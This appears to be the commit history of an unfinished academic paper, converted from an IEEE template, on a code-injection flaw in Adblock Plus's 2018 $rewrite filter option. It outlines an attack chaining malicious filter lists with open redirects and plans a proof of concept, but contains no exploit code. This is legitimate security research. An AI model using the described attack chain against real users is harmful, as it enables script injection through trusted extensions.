### 2023-03-30 paper/paper.tex
Combine latex and bibtex template

\documentclass[conference]{IEEEtran}
\IEEEoverridecommandlockouts
% The preceding line is only needed to identify funding in the first footnote. If that is unneeded, please comment it out.
\usepackage{cite}
\usepackage{amsmath,amssymb,amsfonts}
\usepackage{algorithmic}
\usepackage{graphicx}
\usepackage{textcomp}
\usepackage{xcolor}
\def\BibTeX{{\rm B\kern-.05em{\sc i\kern-.025em b}\kern-.08em
    T\kern-.1667em\lower.7ex\hbox{E}\kern-.125emX}}
\begin{document}

\title{Conference Paper Title*\\
{\footnotesize \textsuperscript{*}Note: Sub-titles are not captured in Xplore and
should not be used}
\thanks{Identify applicable funding agency here. If none, delete this.}
}

\author{\IEEEauthorblockN{1\textsuperscript{st} Given Name Surname}
\IEEEauthorblockA{\textit{dept. name of organization (of Aff.)} \\
\textit{name of organization (of Aff.)}\\
City, Country \\
email address or ORCID}
\and
\IEEEauthorblockN{2\textsuperscript{nd} Given Name Surname}
\IEEEauthorblockA{\textit{dept. name of organization (of Aff.)} \\
\textit{name of organization (of Aff.)}\\
City, Country \\
email address or ORCID}
\and
\IEEEauthorblockN{3\textsuperscript{rd} Given Name Surname}
\IEEEauthorblockA{\textit{dept. name of organization (of Aff.)} \\
\textit{name of organization (of Aff.)}\\
City, Country \\
email address or ORCID}
\and
\IEEEauthorblockN{4\textsuperscript{th} Given Name Surname}
\IEEEauthorblockA{\textit{dept. name of organization (of Aff.)} \\
\textit{name of organization (of Aff.)}\\
City, Country \\
email address or ORCID}
\and
\IEEEauthorblockN{5\textsuperscript{th} Given Name Surname}
\IEEEauthorblockA{\textit{dept. name of organization (of Aff.)} \\
\textit{name of organization (of Aff.)}\\
City, Country \\
email address or ORCID}
\and
\IEEEauthorblockN{6\textsuperscript{th} Given Name Surname}
\IEEEauthorblockA{\textit{dept. name of organization (of Aff.)} \\
\textit{name of organization (of Aff.)}\\
City, Country \\
email address or ORCID}
}

\maketitle

\begin{abstract}
This document is a model and instructions for \LaTeX.
This and the IEEEtran.cls file define the components of your paper [title, text, heads, etc.]. *CRITICAL: Do Not Use Symbols, Special Characters, Footnotes, 
or Math in Paper Title or Abstract.
\end{abstract}

\begin{IEEEkeywords}
component, formatting, style, styling, insert
\end{IEEEkeywords}

\section{Introduction}
This document is a model and instructions for \LaTeX.
Please observe the conference page limits.

\section{Ease of Use}

\subsection{Maintaining the Integrity of the Specifications}

The IEEEtran class file is used to format your paper and style the text. All margins, 
column widths, line spaces, and text fonts are prescribed; please do not 
alter them. You may note peculiarities. For example, the head margin
measures proportionately more than is customary. This measurement 
and others are deliberate, using specifications that anticipate your paper 
as one part of the entire proceedings, and not as an independent document. 
Please do not revise any of the current designations.

\section{Prepare Your Paper Before Styling}
Before you begin to format your paper, first write and save the content as a 
separate text file. Complete all content and organizational editing before 
formatting. Please note sections \ref{AA}--\ref{SCM} below for more information on 
proofreading, spelling and grammar.

Keep your text and graphic files separate until after the text has been 
formatted and styled. Do not number text heads---{\LaTeX} will do that 
for you.

\subsection{Abbreviations and Acronyms}\label{AA}
Define abbreviations and acronyms the first time they are used in the text, 
even after they have been defined in the abstract. Abbreviations such as 
IEEE, SI, MKS, CGS, ac, dc, and rms do not have to be defined. Do not use 
abbreviations in the title or heads unless they are unavoidable.

\subsection{Units}
\begin{itemize}
\item Use either SI (MKS) or CGS as primary units. (SI units are encouraged.) English units may be used as secondary units (in parentheses). An exception would be the use of English units as identifiers in trade, such as ``3.5-inch disk drive''.
\item Avoid combining SI and CGS units, such as current in amperes and magnetic field in oersteds. This often leads to confusion because equations do not balance dimensionally. If you must use mixed units, clearly state the units for each quantity that you use in an equation.
\item Do not mix complete spellings and abbreviations of units: ``Wb/m\textsuperscript{2}'' or ``webers per square meter'', not ``webers/m\textsuperscript{2}''. Spell out units when they appear in text: ``. . . a few henries'', not ``. . . a few H''.
\item Use a zero before decimal points: ``0.25'', not ``.25''. Use ``cm\textsuperscript{3}'', not ``cc''.)
\end{itemize}

\subsection{Equations}
Number equations consecutively. To make your 
equations more compact, you may use the solidus (~/~), the exp function, or 
appropriate exponents. Italicize Roman symbols for quantities and variables, 
but not Greek symbols. Use a long dash rather than a hyphen for a minus 
sign. Punctuate equations with commas or periods when they are part of a 
sentence, as in:
\begin{equation}
a+b=\gamma\label{eq}
\end{equation}

Be sure that the 
symbols in your equation have been defined before or immediately following 
the equation. Use ``\eqref{eq}'', not ``Eq.~\eqref{eq}'' or ``equation \eqref{eq}'', except at 
the beginning of a sentence: ``Equation \eqref{eq} is . . .''

\subsection{\LaTeX-Specific Advice}

Please use ``soft'' (e.g., \verb|\eqref{Eq}|) cross references instead
of ``hard'' references (e.g., \verb|(1)|). That will make it possible
to combine sections, add equations, or change the order of figures or
citations without having to go through the file line by line.

Please don't use the \verb|{eqnarray}| equation environment. Use
\verb|{align}| or \verb|{IEEEeqnarray}| instead. The \verb|{eqnarray}|
environment leaves unsightly spaces around relation symbols.

Please note that the \verb|{subequations}| environment in {\LaTeX}
will increment the main equation counter even when there are no
equation numbers displayed. If you forget that, you might write an
article in which the equation numbers skip from (17) to (20), causing
the copy editors to wonder if you've discovered a new method of
counting.

{\BibTeX} does not work by magic. It doesn't get the bibliographic
data from thin air but from .bib files. If you use {\BibTeX} to produce a
bibliography you must send the .bib files.

{\LaTeX} can't read your mind. If you assign the same label to a
subsubsection and a table, you might find that Table I has been cross
referenced as Table IV-B3.

{\LaTeX} does not have precognitive abilities. If you put a
\verb|\label| command before the command that updates the counter it's
supposed to be using, the label will pick up the last counter to be
cross referenced instead. In particular, a \verb|\label| command
should not go before the caption of a figure or a table.

Do not use \verb|\nonumber| inside the \verb|{array}| environment. It
will not stop equation numbers inside \verb|{array}| (there won't be
any anyway) and it might stop a wanted equation number in the
surrounding equation.

\subsection{Some Common Mistakes}\label{SCM}
\begin{itemize}
\item The word ``data'' is plural, not singular.
\item The subscript for the permeability of vacuum $\mu_{0}$, and other common scientific constants, is zero with subscript formatting, not a lowercase letter ``o''.
\item In American English, commas, semicolons, periods, question and exclamation marks are located within quotation marks only when a complete thought or name is cited, such as a title or full quotation. When quotation marks are used, instead of a bold or italic typeface, to highlight a word or phrase, punctuation should appear outside of the quotation marks. A parenthetical phrase or statement at the end of a sentence is punctuated outside of the closing parenthesis (like this). (A parenthetical sentence is punctuated within the parentheses.)
\item A graph within a graph is an ``inset'', not an ``insert''. The word alternatively is preferred to the word ``alternately'' (unless you really mean something that alternates).
\item Do not use the word ``essentially'' to mean ``approximately'' or ``effectively''.
\item In your paper title, if the words ``that uses'' can accurately replace the word ``using'', capitalize the ``u''; if not, keep using lower-cased.
\item Be aware of the different meanings of the homophones ``affect'' and ``effect'', ``complement'' and ``compliment'', ``discreet'' and ``discrete'', ``principal'' and ``principle''.
\item Do not confuse ``imply'' and ``infer''.
\item The prefix ``non'' is not a word; it should be joined to the word it modifies, usually without a hyphen.
\item There is no period after the ``et'' in the Latin abbreviation ``et al.''.
\item The abbreviation ``i.e.'' means ``that is'', and the abbreviation ``e.g.'' means ``for example''.
\end{itemize}
An excellent style manual for science writers is \cite{b7}.

\subsection{Authors and Affiliations}
\textbf{The class file is designed for, but not limited to, six authors.} A 
minimum of one author is required for all conference articles. Author names 
should be listed starting from left to right and then moving down to the 
next line. This is the author sequence that will be used in future citations 
and by indexing services. Names should not be listed in columns nor group by 
affiliation. Please keep your affiliations as succinct as possible (for 
example, do not differentiate among departments of the same organization).

\subsection{Identify the Headings}
Headings, or heads, are organizational devices that guide the reader through 
your paper. There are two types: component heads and text heads.

Component heads identify the different components of your paper and are not 
topically subordinate to each other. Examples include Acknowledgments and 
References and, for these, the correct style to use is ``Heading 5''. Use 
``figure caption'' for your Figure captions, and ``table head'' for your 
table title. Run-in heads, such as ``Abstract'', will require you to apply a 
style (in this case, italic) in addition to the style provided by the drop 
down menu to differentiate the head from the text.

Text heads organize the topics on a relational, hierarchical basis. For 
example, the paper title is the primary text head because all subsequent 
material relates and elaborates on this one topic. If there are two or more 
sub-topics, the next level head (uppercase Roman numerals) should be used 
and, conversely, if there are not at least two sub-topics, then no subheads 
should be introduced.

\subsection{Figures and Tables}
\paragraph{Positioning Figures and Tables} Place figures and tables at the top and 
bottom of columns. Avoid placing them in the middle of columns. Large 
figures and tables may span across both columns. Figure captions should be 
below the figures; table heads should appear above the tables. Insert 
figures and tables after they are cited in the text. Use the abbreviation 
``Fig.~\ref{fig}'', even at the beginning of a sentence.

\begin{table}[htbp]
\caption{Table Type Styles}
\begin{center}
\begin{tabular}{|c|c|c|c|}
\hline
\textbf{Table}&\multicolumn{3}{|c|}{\textbf{Table Column Head}} \\
\cline{2-4} 
\textbf{Head} & \textbf{\textit{Table column subhead}}& \textbf{\textit{Subhead}}& \textbf{\textit{Subhead}} \\
\hline
copy& More table copy$^{\mathrm{a}}$& &  \\
\hline
\multicolumn{4}{l}{$^{\mathrm{a}}$Sample of a Table footnote.}
\end{tabular}
\label{tab1}
\end{center}
\end{table}

\begin{figure}[htbp]
\centerline{\includegraphics{fig1.png}}
\caption{Example of a figure caption.}
\label{fig}
\end{figure}

Figure Labels: Use 8 point Times New Roman for Figure labels. Use words 
rather than symbols or abbreviations when writing Figure axis labels to 
avoid confusing the reader. As an example, write the quantity 
``Magnetization'', or ``Magnetization, M'', not just ``M''. If including 
units in the label, present them within parentheses. Do not label axes only 
with units. In the example, write ``Magnetization (A/m)'' or ``Magnetization 
\{A[m(1)]\}'', not just ``A/m''. Do not label axes with a ratio of 
quantities and units. For example, write ``Temperature (K)'', not 
``Temperature/K''.

\section*{Acknowledgment}

The preferred spelling of the word ``acknowledgment'' in America is without 
an ``e'' after the ``g''. Avoid the stilted expression ``one of us (R. B. 
G.) thanks $\ldots$''. Instead, try ``R. B. G. thanks$\ldots$''. Put sponsor 
acknowledgments in the unnumbered footnote on the first page.

\section*{References}

Please number citations consecutively within brackets \cite{b1}. The 
sentence punctuation follows the bracket \cite{b2}. Refer simply to the reference 
number, as in \cite{b3}---do not use ``Ref. \cite{b3}'' or ``reference \cite{b3}'' except at 
the beginning of a sentence: ``Reference \cite{b3} was the first $\ldots$''

Number footnotes separately in superscripts. Place the actual footnote at 
the bottom of the column in which it was cited. Do not put footnotes in the 
abstract or reference list. Use letters for table footnotes.

Unless there are six authors or more give all authors' names; do not use 
``et al.''. Papers that have not been published, even if they have been 
submitted for publication, should be cited as ``unpublished'' \cite{b4}. Papers 
that have been accepted for publication should be cited as ``in press'' \cite{b5}. 
Capitalize only the first word in a paper title, except for proper nouns and 
element symbols.

For papers published in translation journals, please give the English 
citation first, followed by the original foreign-language citation \cite{b6}.

\bibliographystyle{IEEEtran}
\bibliography{references}
\vspace{12pt}
\color{red}
IEEE conference templates contain guidance text for composing and formatting conference papers. Please ensure that all template text is removed from your conference paper prior to submission to the conference. Failure to remove the template text from your paper may result in your paper not being published.

\end{document}

### 2023-03-30 paper/paper.tex
Remove template strings

@@
 
-\title{Conference Paper Title*\\
-{\footnotesize \textsuperscript{*}Note: Sub-titles are not captured in Xplore and
-should not be used}
-\thanks{Identify applicable funding agency here. If none, delete this.}
+\title{Arbitrary code injection in Adblock Plus
+% \thanks{Identify applicable funding agency here. If none, delete this.}
 }
 
-\author{\IEEEauthorblockN{1\textsuperscript{st} Given Name Surname}
-\IEEEauthorblockA{\textit{dept. name of organization (of Aff.)} \\
-\textit{name of organization (of Aff.)}\\
-City, Country \\
-email address or ORCID}
+\author{\IEEEauthorblockN{Eric Li}
+\IEEEauthorblockA{Information Networking Institute \\
+Carnegie Mellon University\\
+Pittsburgh, U.S.A \\
+xiaoyili@andrew.cmu.edu}
 \and
-\IEEEauthorblockN{2\textsuperscript{nd} Given Name Surname}
-\IEEEauthorblockA{\textit{dept. name of organization (of Aff.)} \\
-\textit{name of organization (of Aff.)}\\
-City, Country \\
-email address or ORCID}
+\IEEEauthorblockN{Teresa Alberto}
+\IEEEauthorblockA{\textit{(TODO) dept. name of organization (of Aff.)} \\
+\textit{(TODO) name of organization (of Aff.)}\\
+(TODO) City, Country \\
+(TODO) email address or ORCID}
 \and
-\IEEEauthorblockN{3\textsuperscript{rd} Given Name Surname}
-\IEEEauthorblockA{\textit{dept. name of organization (of Aff.)} \\
-\textit{name of organization (of Aff.)}\\
-City, Country \\
-email address or ORCID}
-\and
-\IEEEauthorblockN{4\textsuperscript{th} Given Name Surname}
-\IEEEauthorblockA{\textit{dept. name of organization (of Aff.)} \\
-\textit{name of organization (of Aff.)}\\
-City, Country \\
-email address or ORCID}
-\and
-\IEEEauthorblockN{5\textsuperscript{th} Given Name Surname}
-\IEEEauthorblockA{\textit{dept. name of organization (of Aff.)} \\
-\textit{name of organization (of Aff.)}\\
-City, Country \\
-email address or ORCID}
-\and
-\IEEEauthorblockN{6\textsuperscript{th} Given Name Surname}
-\IEEEauthorblockA{\textit{dept. name of organization (of Aff.)} \\
-\textit{name of organization (of Aff.)}\\
-City, Country \\
-email address or ORCID}
+\IEEEauthorblockN{Chengcheng Ding}
+\IEEEauthorblockA{\textit{(TODO) dept. name of organization (of Aff.)} \\
+\textit{(TODO) name of organization (of Aff.)}\\
+(TODO) City, Country \\
+(TODO) email address or ORCID}
 }
@@
 \begin{abstract}
-This document is a model and instructions for \LaTeX.
-This and the IEEEtran.cls file define the components of your paper [title, text, heads, etc.]. *CRITICAL: Do Not Use Symbols, Special Characters, Footnotes, 
-or Math in Paper Title or Abstract.
+TODO
+% This document is a model and instructions for \LaTeX.
+This and the IEEEtran.cls file define the components of your paper [title, text, heads, etc.].
+*CRITICAL: Do Not Use Symbols, Special Characters, Footnotes, or Math in Paper Title or Abstract.
 \end{abstract}
@@
 \begin{IEEEkeywords}
-component, formatting, style, styling, insert
+browser, extension, ad blocking, XSS
 \end{IEEEkeywords}
@@
 \section{Introduction}
-This document is a model and instructions for \LaTeX.
-Please observe the conference page limits.
+TODO \cite{b1}
 
-\section{Ease of Use}
+\section{Background and Goals}
+TODO
 
-\subsection{Maintaining the Integrity of the Specifications}
+\section{Attack Outline}
+TODO
 
-The IEEEtran class file is used to format your paper and style the text. All margins, 
-column widths, line spaces, and text fonts are prescribed; please do not 
-alter them. You may note peculiarities. For example, the head margin
-measures proportionately more than is customary. This measurement 
-and others are deliberate, using specifications that anticipate your paper 
-as one part of the entire proceedings, and not as an independent document. 
-Please do not revise any of the current designations.
+\section{Implementation}
+TODO
 
-\section{Prepare Your Paper Before Styling}
-Before you begin to format your paper, first write and save the content as a 
-separate text file. Complete all content and organizational editing before 
-formatting. Please note sections \ref{AA}--\ref{SCM} below for more information on 
-proofreading, spelling and grammar.
+\section{Discussion and Limitations}
+TODO
 
-Keep your text and graphic files separate until after the text has been 
-formatted and styled. Do not number text heads---{\LaTeX} will do that 
-for you.
+\section{Related Work}
+TODO
 
-\subsection{Abbreviations and Acronyms}\label{AA}
-Define abbreviations and acronyms the first time they are used in the text, 
-even after they have been defined in the abstract. Abbreviations such as 
-IEEE, SI, MKS, CGS, ac, dc, and rms do not have to be defined. Do not use 
-abbreviations in the title or heads unless they are unavoidable.
+\section{Conclusion}
+TODO
 
-\subsection{Units}
-\begin{itemize}
-\item Use either SI (MKS) or CGS as primary units.
-(SI units are encouraged.) English units may be used as secondary units (in parentheses).
-An exception would be the use of English units as identifiers in trade, such as ``3.5-inch disk drive''.
-\item Avoid combining SI and CGS units, such as current in amperes and magnetic field in oersteds.
-This often leads to confusion because equations do not balance dimensionally.
-If you must use mixed units, clearly state the units for each quantity that you use in an equation.
-\item Do not mix complete spellings and abbreviations of units: ``Wb/m\textsuperscript{2}'' or ``webers per square meter'', not ``webers/m\textsuperscript{2}''.
-Spell out units when they appear in text: ``.
-.
-.
-a few henries'', not ``.
-.
-.
-a few H''.
-\item Use a zero before decimal points: ``0.25'', not ``.25''. Use ``cm\textsuperscript{3}'', not ``cc''.)
-\end{itemize}
+\section*{Acknowledgment}
+TODO
 
-\subsection{Equations}
-Number equations consecutively. To make your 
-equations more compact, you may use the solidus (~/~), the exp function, or 
-appropriate exponents. Italicize Roman symbols for quantities and variables, 
-but not Greek symbols. Use a long dash rather than a hyphen for a minus 
-sign. Punctuate equations with commas or periods when they are part of a 
-sentence, as in:
-\begin{equation}
-a+b=\gamma\label{eq}
-\end{equation}
+\bibliographystyle{IEEEtran}
+\bibliography{references}
 
-Be sure that the 
-symbols in your equation have been defined before or immediately following 
-the equation. Use ``\eqref{eq}'', not ``Eq.~\eqref{eq}'' or ``equation \eqref{eq}'', except at 
-the beginning of a sentence: ``Equation \eqref{eq} is . . .''
-
-\subsection{\LaTeX-Specific Advice}
-
-Please use ``soft'' (e.g., \verb|\eqref{Eq}|) cross references instead
-of ``hard'' references (e.g., \verb|(1)|). That will make it possible
-to combine sections, add equations, or change the order of figures or
-citations without having to go through the file line by line.
-
-Please don't use the \verb|{eqnarray}| equation environment. Use
-\verb|{align}| or \verb|{IEEEeqnarray}| instead. The \verb|{eqnarray}|
-environment leaves unsightly spaces around relation symbols.
-
-Please note that the \verb|{subequations}| environment in {\LaTeX}
-will increment the main equation counter even when there are no
-equation numbers displayed. If you forget that, you might write an
-article in which the equation numbers skip from (17) to (20), causing
-the copy editors to wonder if you've discovered a new method of
-counting.
-
-{\BibTeX} does not work by magic. It doesn't get the bibliographic
-data from thin air but from .bib files. If you use {\BibTeX} to produce a
-bibliography you must send the .bib files.
-
-{\LaTeX} can't read your mind. If you assign the same label to a
-subsubsection and a table, you might find that Table I has been cross
-referenced as Table IV-B3.
-
-{\LaTeX} does not have precognitive abilities. If you put a
-\verb|\label| command before the command that updates the counter it's
-supposed to be using, the label will pick up the last counter to be
-cross referenced instead. In particular, a \verb|\label| command
-should not go before the caption of a figure or a table.
-
-Do not use \verb|\nonumber| inside the \verb|{array}| environment. It
-will not stop equation numbers inside \verb|{array}| (there won't be
-any anyway) and it might stop a wanted equation number in the
-surrounding equation.
-
-\subsection{Some Common Mistakes}\label{SCM}
-\begin{itemize}
-\item The word ``data'' is plural, not singular.
-\item The subscript for the permeability of vacuum $\mu_{0}$, and other common scientific constants, is zero with subscript formatting, not a lowercase letter ``o''.
-\item In American English, commas, semicolons, periods, question and exclamation marks are located within quotation marks only when a complete thought or name is cited, such as a title or full quotation.
-When quotation marks are used, instead of a bold or italic typeface, to highlight a word or phrase, punctuation should appear outside of the quotation marks.
-A parenthetical phrase or statement at the end of a sentence is punctuated outside of the closing parenthesis (like this).
-(A parenthetical sentence is punctuated within the parentheses.)
-\item A graph within a graph is an ``inset'', not an ``insert''. The word alternatively is preferred to the word ``alternately'' (unless you really mean something that alternates).
-\item Do not use the word ``essentially'' to mean ``approximately'' or ``effectively''.
-\item In your paper title, if the words ``that uses'' can accurately replace the word ``using'', capitalize the ``u''; if not, keep using lower-cased.
-\item Be aware of the different meanings of the homophones ``affect'' and ``effect'', ``complement'' and ``compliment'', ``discreet'' and ``discrete'', ``principal'' and ``principle''.
-\item Do not confuse ``imply'' and ``infer''.
-\item The prefix ``non'' is not a word; it should be joined to the word it modifies, usually without a hyphen.
-\item There is no period after the ``et'' in the Latin abbreviation ``et al.''.
-\item The abbreviation ``i.e.'' means ``that is'', and the abbreviation ``e.g.'' means ``for example''.
-\end{itemize}
-An excellent style manual for science writers is \cite{b7}.
-
-\subsection{Authors and Affiliations}
-\textbf{The class file is designed for, but not limited to, six authors.} A 
-minimum of one author is required for all conference articles. Author names 
-should be listed starting from left to right and then moving down to the 
-next line. This is the author sequence that will be used in future citations 
-and by indexing services. Names should not be listed in columns nor group by 
-affiliation. Please keep your affiliations as succinct as possible (for 
-example, do not differentiate among departments of the same organization).
-
-\subsection{Identify the Headings}
-Headings, or heads, are organizational devices that guide the reader through 
-your paper. There are two types: component heads and text heads.
-
-Component heads identify the different components of your paper and are not 
-topically subordinate to each other. Examples include Acknowledgments and 
-References and, for these, the correct style to use is ``Heading 5''. Use 
-``figure caption'' for your Figure captions, and ``table head'' for your 
-table title. Run-in heads, such as ``Abstract'', will require you to apply a 
-style (in this case, italic) in addition to the style provided by the drop 
-down menu to differentiate the head from the text.
-
-Text heads organize the topics on a relational, hierarchical basis. For 
-example, the paper title is the primary text head because all subsequent 
-material relates and elaborates on this one topic. If there are two or more 
-sub-topics, the next level head (uppercase Roman numerals) should be used 
-and, conversely, if there are not at least two sub-topics, then no subheads 
-should be introduced.
-
-\subsection{Figures and Tables}
-\paragraph{Positioning Figures and Tables} Place figures and tables at the top and 
-bottom of columns. Avoid placing them in the middle of columns. Large 
-figures and tables may span across both columns. Figure captions should be 
-below the figures; table heads should appear above the tables. Insert 
-figures and tables after they are cited in the text. Use the abbreviation 
-``Fig.~\ref{fig}'', even at the beginning of a sentence.
+\end{document}
 
@@
 \end{figure}
-
-Figure Labels: Use 8 point Times New Roman for Figure labels. Use words 
-rather than symbols or abbreviations when writing Figure axis labels to 
-avoid confusing the reader. As an example, write the quantity 
-``Magnetization'', or ``Magnetization, M'', not just ``M''. If including 
-units in the label, present them within parentheses. Do not label axes only 
-with units. In the example, write ``Magnetization (A/m)'' or ``Magnetization 
-\{A[m(1)]\}'', not just ``A/m''. Do not label axes with a ratio of 
-quantities and units. For example, write ``Temperature (K)'', not 
-``Temperature/K''.
-
-\section*{Acknowledgment}
-
-The preferred spelling of the word ``acknowledgment'' in America is without 
-an ``e'' after the ``g''. Avoid the stilted expression ``one of us (R. B. 
-G.) thanks $\ldots$''. Instead, try ``R. B. G. thanks$\ldots$''. Put sponsor 
-acknowledgments in the unnumbered footnote on the first page.
-
-\section*{References}
-
-Please number citations consecutively within brackets \cite{b1}. The 
-sentence punctuation follows the bracket \cite{b2}. Refer simply to the reference 
-number, as in \cite{b3}---do not use ``Ref. \cite{b3}'' or ``reference \cite{b3}'' except at 
-the beginning of a sentence: ``Reference \cite{b3} was the first $\ldots$''
-
-Number footnotes separately in superscripts. Place the actual footnote at 
-the bottom of the column in which it was cited. Do not put footnotes in the 
-abstract or reference list. Use letters for table footnotes.
-
-Unless there are six authors or more give all authors' names; do not use 
-``et al.''. Papers that have not been published, even if they have been 
-submitted for publication, should be cited as ``unpublished'' \cite{b4}. Papers 
-that have been accepted for publication should be cited as ``in press'' \cite{b5}. 
-Capitalize only the first word in a paper title, except for proper nouns and 
-element symbols.
-
-For papers published in translation journals, please give the English 
-citation first, followed by the original foreign-language citation \cite{b6}.
-
-\bibliographystyle{IEEEtran}
-\bibliography{references}
-\vspace{12pt}
-\color{red}
-IEEE conference templates contain guidance text for composing and formatting conference papers.
-Please ensure that all template text is removed from your conference paper prior to submission to the conference.
-Failure to remove the template text from your paper may result in your paper not being published.
-
-\end{document}

### 2023-03-30 paper/paper.tex
Copy content from google docs

@@
 TODO
+\begin{itemize}
+\item Blocking Ads extensions massive adoption.
+\item Adblock filters contain a lot of lines.
+\item \$rewrite rule: what it does, why is it introduced.
+\item Goal 1: prove that they imply a new attack surface.
+\item Goal 2: create a full working Proof of Concept.
+\end{itemize}
 
@@
 TODO
+\begin{itemize}
+\item Victim website: Open redirect combined with fetching and loading JS code provokes worse problems.
+\item Victim user: install malicious filter list (may be updated automatically), visit victim website.
+\item Attacker: control the malicious filter list.
+\item Potential impact.
+\end{itemize}
 
@@
 TODO
+\begin{itemize}
+\item Recreating the environment.
+\item Adblock plus version vulnerable, browser version
+\item Attacker’s website.
+\item Victim’s website.
+\item CSP policies.
+\end{itemize}
 
@@
 TODO
+\begin{itemize}
+\item How Google mitigated the issue.
+\item How Adblock Plus defended (limits the ability of filter rules).
+\item Public warnings previous the deploy of the \$rewrite feature.
+\item Limitations: downgrade of browser version was needed.
+\item Limitations: further analysis on other browsers.
+\end{itemize}
 
@@
 TODO
+\begin{itemize}
+\item Advertisement blocking and detection.
+\end{itemize}
 

### 2023-04-19 paper/paper.tex
First reference
Update bib
Sync from Overleaf

@@
 
-\title{Arbitrary code injection in Adblock Plus
+\title{Arbitrary Code Injection in Adblock Plus
 % \thanks{Identify applicable funding agency here. If none, delete this.}
@@
 \IEEEauthorblockN{Teresa Alberto}
-\IEEEauthorblockA{\textit{(TODO) dept. name of organization (of Aff.)} \\
-\textit{(TODO) name of organization (of Aff.)}\\
-(TODO) City, Country \\
-(TODO) email address or ORCID}
+\IEEEauthorblockA{
+Information Networking Institute \\
+Carnegie Mellon University\\
+Pittsburgh, U.S.A \\
+talberto@andrew.cmu.edu
+}
 \and
 \IEEEauthorblockN{Chengcheng Ding}
-\IEEEauthorblockA{\textit{(TODO) dept. name of organization (of Aff.)} \\
-\textit{(TODO) name of organization (of Aff.)}\\
-(TODO) City, Country \\
-(TODO) email address or ORCID}
+\IEEEauthorblockA{
+Information Networking Institute \\
+Carnegie Mellon University\\
+Pittsburgh, U.S.A \\
+chengchd@andrew.cmu.edu
+}
 }
@@
 \begin{IEEEkeywords}
-browser, extension, ad blocking, XSS
+browser security, browser extension, ad blocking, XSS
 \end{IEEEkeywords}
@@
 \section{Introduction}
-TODO \cite{b1}
+% Author: Chengcheng Ding
+Since the very beginning of their introduction, browser extensions expose additional attack surfaces for browsers.
+Their popularity among users only makes the matter worse: a vulnerability in a popular extension can affect millions of users.
+One such popular extension is Adblock Plus, which has tens of millions of users on Chrome and Firefox combined.
+\cite{noauthor_adblockchrome_nodate, noauthor_adblockfirefox_nodate} In this article, we will investigate a vulnerability introduced in a previous version of Adblock Plus that enabled the execution of arbitrary code on users' devices.
+
+Adblock Plus has a very well-intended feature that allows users to apply custom filter rules.
+To do so, users can supply a text file that provides (a list of) rule(s) written in the syntax specified by Adblock Plus.
+Similarly, users can also apply custom filter rules crafted by others to their Adblock Plus extensions.
+This introduced another party in the threat model.
+
+A standard custom filter rule mentioned above consists of 2 items:
+\begin{enumerate}
+    \item A pattern of URIs. All requests made to a URI that fits such a pattern will be filtered
+    \item The action to the request that will be filtered. The most obvious and straightforward example would be blocking that request.
+\end{enumerate}
+
+In Adblock Plus version 3.2, released on July 17, 2018, a new option for filter action is introduced: rewrite.
+It allowed users to rewrite requests to a new destination.
+In that release, it is restricted that the new destination must be of the same origin as the original request.
+Unfortunately, this introduced new vulnerabilities that allowed arbitrary code execution on user machines that somehow applied malicious filter rules to their extension.
+\cite{abp_code_injection,abp_issue_6622,abp_rewrite_pr,abp_filter_guide}
+
+We contribute the following:
+\begin{enumerate}
+    \item An explanation of the technology details behind the attack.
+    \item A detailed guide to re-implementing the attack, that specifies corresponding versions of the products related, and a demo website that showcases the attack.
+    \item What we can learn from this vulnerability: its impacts, and what vendors can do to mitigate against it.
+\end{enumerate}
 
 \section{Background and Goals}
-TODO
-\begin{itemize}
-\item Blocking Ads extensions massive adoption.
-\item Adblock filters contain a lot of lines.
-\item \$rewrite rule: what it does, why is it introduced.
-\item Goal 1: prove that they imply a new attack surface.
-\item Goal 2: create a full working Proof of Concept.
-\end{itemize}
+\subsection{Massive adaptation of ad-blocking extensions}
+% Author: Chengcheng Ding
+Extensions play a critical role in the capabilities of modern browsers, enabling customized web experiences.
+Among them is a popular category of extensions that blocks advertisements on web pages.
+One of the most popular in that category is Adblock Plus.
+According to statistics from the Chrome extensions web store and Mozilla Firefox add-on store, tens of millions of users have Adblock Plus installed.
+\cite{noauthor_adblockchrome_nodate, noauthor_adblockfirefox_nodate} According to a study by Pujol et al., 22\% of the most active users analyzed browse the Web with Adblock Plus.
+In fact, Ad-blocking extensions are so popular that advertisement vendors have begun to take active measures against them.\cite{mughees_first_2016} Therefore, vulnerabilities from the Adblock Plus extension can impact a considerable amount of internet users.
+That is why we have chosen to investigate a vulnerability in a previous version of Adblock Plus.
+
+\subsection{Custom filters in Adblock Plus}
+% Author: Chengcheng Ding
+The default advertisement-blocking behaviors of Adblock Plus are defined by a filter list included in the extension.
+In addition to that, Adblock Plus enables custom filters created by users.
+These filters allow users to block ads and other unwanted content that may not be covered by the default filter lists.
+Users can create their own filters by specifying URLs or patterns of URLs, and the actions they want to take against them, such as blocking or allowing.
+Custom filter lists can also be shared with other Adblock Plus users.
+From a security standpoint, custom filters involve additional third parties in the flow of ad-blocking, potentially creating additional attack surfaces.
+The filters are not written in a syntax easily understandable for most average users.
+Hence, attackers can embed malicious filter actions and present them to users as a filter for additional features, if the filter rules' functionalities allow them.
+
+\subsection{The rewrite rule: What and Why}
+% Author: Chengcheng Ding
+In version 3.2 of Adblock Plus, released on July 17, 2018, a new filter option called "rewrite" was introduced.
+It allows users to rewrite outgoing requests to certain URL(s).
+In this version, the destination of requests can be rewritten to resources within the same origin.
+For example, a request to "foo.com/ad.js" can be rewritten to "foo.com/not-ad.js".
+\\
+There can be multiple correct usages of the rewrite filter.
+The first (and primary) one is when simply blocking a request to a certain advertisement-related resource will lead to an error.
+That's when rewriting the request is a reasonable way to block advertisements with minimal impact on user experience.
+\\
+Another potential way of using the rewrite filter is eliminating certain HTTP request parameters related to privacy.
+Advertisers have long used HTTP request parameters for cross-site tracking.
+Parameters in advertisement links help vendors figure out where the click comes from.
+Therefore, the rewrite filter can be utilized in this scenario to eliminate request parameters related to tracking.
+\\
+
+\subsection{Goals of this project}
+% Author: Chengcheng Ding
+There are mainly 2 goals for this project, centered around the vulnerability introduced by the first implementation of the rewrite rule, and its implications. \\
+The first goal is to prove that the vulnerability implies a previously understated attack surface.
+The vulnerability's chain of exploits utilizes vulnerabilities, or even features, that would be considered low-impact or no-impact on their own.
+For example, a crucial component of this vulnerability, open redirect, would be considered a feature instead of a vulnerability in many websites.
+As a matter of fact, Google is still choosing to keep its open redirects while acknowledging it can be a tool for phishers.\cite{noauthor_open_nodate} \\
+The second goal of this project is to recreate a proof of concept of the attack scenario.
+The proof of concept will specify the versions of all of the related software, and provide a skeleton website to demonstrate the capabilities of the attack.
+The details of the proof of concept can be found in section \ref{Implementation}.\\
 
@@
 
-\section{Implementation}
